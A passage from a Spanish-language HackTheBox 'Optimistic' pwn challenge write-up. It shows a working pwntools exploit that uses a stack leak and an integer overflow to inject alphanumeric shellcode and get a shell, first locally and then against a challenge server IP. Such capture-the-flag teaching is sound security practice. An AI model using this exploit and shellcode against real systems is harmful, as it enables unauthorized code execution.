    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Would you like to enroll yourself? (y/n): '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'y'</span><span class="p">)</span>

    <span class="c1"># Extracting Stack Leak
</span>    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Great! Here</span><span class="se">\'</span><span class="s">s a small welcome gift: '</span><span class="p">)</span>
    <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">stack_leak_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Stack Leaked Address: f</span><span class="si">{</span><span class="n">stack_leak</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Email: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Age: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'-1'</span><span class="p">)</span>

    <span class="c1"># Exploiting Integer Overflow
</span>    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Length of name: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'-1'</span><span class="p">)</span>

    <span class="c1"># Shellcode
</span>    <span class="n">offset</span> <span class="o">=</span> <span class="mi">104</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> 
    <span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">stack_leak_addr</span>
     
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Name: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Como se muestra en imagen, el exploit nos entrega una <code class="language-plaintext highlighter-rouge">shell</code> interactiva de forma inmediata:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%2012.png" alt="Untitled" /></p><p>Para completar el desafío, sólo debemos adaptar el exploit para que se conecte al host de HackTheBox con la función <code class="language-plaintext highlighter-rouge">remote</code>, en lugar de <code class="language-plaintext highlighter-rouge">process</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">p64</span><span class="p">,</span> <span class="n">log</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'206.189.121.78'</span><span class="p">,</span> <span class="mi">31545</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Would you like to enroll yourself? (y/n): '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'y'</span><span class="p">)</span>

    <span class="c1"># Extracting Stack Leak
</span>    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Great! Here</span><span class="se">\'</span><span class="s">s a small welcome gift: '</span><span class="p">)</span>
    <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">stack_leak_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Stack Leaked Address: f</span><span class="si">{</span><span class="n">stack_leak</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Email: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Age: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'-1'</span><span class="p">)</span>

    <span class="c1"># Exploiting Integer Overflow
</span>    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Length of name: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'-1'</span><span class="p">)</span>

    <span class="c1"># Shellcode
</span>    <span class="n">offset</span> <span class="o">=</span> <span class="mi">104</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> 
    <span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">stack_leak_addr</span>
     
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Name: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Y ya con esto, el desafío está <code class="language-plaintext highlighter-rouge">pwned</code>:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%2013.png" alt="Untitled" /></p><h3 id="references">References</h3><ul><li>What is an Integer Overflow (Acunetix): <a href="https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/">https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/</a><li>C and C++ Integer Limits (Microsoft): <a href="https://learn.microsoft.com/es-es/cpp/c-language/cpp-integer-limits">https://learn.microsoft.com/es-es/cpp/c-language/cpp-integer-limits</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/linux/'>linux</a>, <a href='/categories/binary-exploitation/'>binary exploitation</a>, <a href='/categories/htb/'>htb</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/64-bit/" class="post-tag no-text-decoration" >64-bit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://github.com/sha-16" data-toggle="tooltip" data-placement="top" title="github" target="_blank" rel="noopener" aria-label="github"> <i class="fa-fw fab fa-github"></i> </a> <a href="https://twitter.com/sha16_x" data-toggle="tooltip" data-placement="top" title="twitter" target="_blank" rel="noopener" aria-label="twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.youtube.com/channel/UCZrqUzohXiWRaJ7YdhVpZqA/videos" data-toggle="tooltip" data-placement="top" title="youtube" target="_blank" rel="noopener" aria-label="youtube"> <i class="fa-fw fab fa-youtube"></i> </a> <a href="https://twitch.tv/sha_16_/" data-toggle="tooltip" data-placement="top" title="twitch" target="_blank" rel="noopener" aria-label="twitch"> <i class="fa-fw fab fa-twitch"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Resolute-HackTheBox-Machine/">Resolute - Write Up (HTB) ❤</a><li><a href="/posts/Forest-HackTheBox-Machine/">Forest - Write Up (HTB) ❤</a><li><a href="/posts/Sauna-HackTheBox-Machine/">Sauna - Write Up (HTB) ❤</a><li><a href="/posts/Active-HackTheBox-Machine/">Active - Write Up (HTB) ❤</a><li><a href="/posts/Blackfield-HackTheBox-Machine/">Blackfield - Write Up (HTB) ❤</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/64-bit/">64-bit</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS-REP Roasting</a> <a class="post-tag" href="/tags/abusing-dcsync/">Abusing DCSync</a> <a class="post-tag" href="/tags/abusing-account-operators/">Abusing Account Operators</a> <a class="post-tag" href="/tags/abusing-backup-operators/">Abusing Backup Operators</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/BatComputer-HackTheBox-Pwn/"><div class="card-body"> <span class="timeago small" >Sep 10<i class="unloaded">2023-09-10T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bat Computer - Pwn Challenge (HTB) ❤</h3><div class="text-muted small"><p> Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. En esta ocasión, les traigo la resolución de un BoF en un binario de 64-bit. El desafío como tal, consiste en un programa que te ...</p></div></div></a></div><div class="card"> <a href="/posts/Reg-HackTheBox-Pwn/"><div class="card-body"> <span class="timeago small" >Sep 17<i class="unloaded">2023-09-17T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reg - Pwn Challenge (HTB) ❤</h3><div class="text-muted small"><p> Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. Este es un reto de pwning, del tipo ret2win, el cual implica explotar un Buffer Overflow con el objetivo hacer una llamado a una ...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Console-HackTheBox-Pwn/"><div class="card-body"> <span class="timeago small" >Sep 23<i class="unloaded">2023-09-23T00:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-Console - Pwn Challenge (HTB) ❤</h3><div class="text-muted small"><p> Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. Este es un reto de pwning, del tipo ret2system, similar al ret2libc, el cual implica explotar un Buffer Overflow con el objetivo ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/BatComputer-HackTheBox-Pwn/" class="btn btn-outline-primary" prompt="Older"><p>Bat Computer - Pwn Challenge (HTB) ❤</p></a> <a href="/posts/Reg-HackTheBox-Pwn/" class="btn btn-outline-primary" prompt="Newer"><p>Reg - Pwn Challenge (HTB) ❤</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/sha-16">Diego Osorio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/64-bit/">64 bit</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS REP Roasting</a> <a class="post-tag" href="/tags/abusing-dcsync/">Abusing DCSync</a> <a class="post-tag" href="/tags/abusing-account-operators/">Abusing Account Operators</a> <a class="post-tag" href="/tags/abusing-backup-operators/">Abusing Backup Operators</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="diegoosorib" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. Feel free to invite me a coffee if you like my content ❤" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
